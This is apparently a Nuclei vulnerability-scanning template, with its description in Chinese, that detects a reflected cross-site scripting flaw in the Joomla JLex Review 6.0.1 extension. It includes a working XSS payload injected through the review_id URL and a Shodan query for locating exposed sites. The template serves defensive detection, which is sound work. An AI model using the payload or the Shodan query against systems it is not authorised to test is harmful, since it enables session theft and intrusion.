id: joomla-jlex-xss

info:
  name: Joomla JLex Review 6.0.1 - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: |
    该模板用于检测 Joomla JLex Review 6.0.1 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3b...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://www.exploitalert.com/view-details.html?id=39732
    - https://www.exploit-db.com/exploits/51645
    - https://extensions.joomla.org/extension/jlex-review/
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-1950415971
  tags: joomla,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<a href="/?itwed"onmouseover="confirm(document.domain)"style='
          - 'jlex-review'
        condition: and

      - type: status
        status:
          - 200
